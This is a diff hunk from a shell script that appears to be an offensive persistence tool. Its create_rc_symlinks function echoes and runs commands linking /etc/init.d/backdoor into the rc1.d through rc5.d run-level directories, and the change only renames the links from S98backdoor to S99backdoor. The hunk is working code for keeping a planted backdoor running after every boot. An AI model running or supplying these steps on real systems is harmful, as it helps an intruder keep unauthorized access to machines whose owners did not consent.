@@ -76,16 +76,16 @@ function create_init_service {
 
 function create_rc_symlinks {
 	echo -e "${item} Create symbolic links of backdoor for run levels from 1 to 5"
-	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc1.d/S98backdoor${endColor}"
-	ln -s /etc/init.d/backdoor /etc/rc1.d/S98backdoor
-	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc2.d/S98backdoor${endColor}"
-	ln -s /etc/init.d/backdoor /etc/rc2.d/S98backdoor
-	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc3.d/S98backdoor${endColor}"
-	ln -s /etc/init.d/backdoor /etc/rc3.d/S98backdoor
-	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc4.d/S98backdoor${endColor}"
-	ln -s /etc/init.d/backdoor /etc/rc4.d/S98backdoor
-	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc5.d/S98backdoor${endColor}"
-	ln -s /etc/init.d/backdoor /etc/rc5.d/S98backdoor
+	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc1.d/S99backdoor${endColor}"
+	ln -s /etc/init.d/backdoor /etc/rc1.d/S99backdoor
+	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc2.d/S99backdoor${endColor}"
+	ln -s /etc/init.d/backdoor /etc/rc2.d/S99backdoor
+	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc3.d/S99backdoor${endColor}"
+	ln -s /etc/init.d/backdoor /etc/rc3.d/S99backdoor
+	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc4.d/S99backdoor${endColor}"
+	ln -s /etc/init.d/backdoor /etc/rc4.d/S99backdoor
+	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc5.d/S99backdoor${endColor}"
+	ln -s /etc/init.d/backdoor /etc/rc5.d/S99backdoor
 	echo ""
 }
 
